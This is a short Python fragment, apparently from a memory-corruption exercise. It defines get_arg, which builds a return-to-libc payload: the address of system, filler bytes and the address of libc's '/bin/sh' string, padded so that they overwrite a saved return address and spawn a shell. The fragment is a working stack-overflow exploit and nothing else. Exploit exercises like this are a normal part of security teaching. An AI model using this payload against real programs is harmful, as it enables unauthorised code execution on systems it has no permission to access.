...
def get_arg() -> bytes:
    ...
    """
    system_stuff = addresses.address_to_bytes(addresses.SYSTEM) + bytes([90]*4) + addresses.address_to_bytes(addresses.LIBC_BIN_SH)
    return system_stuff.rjust(addresses.RA - addresses.BUFF_START + len(system_stuff) ,bytes([90]))
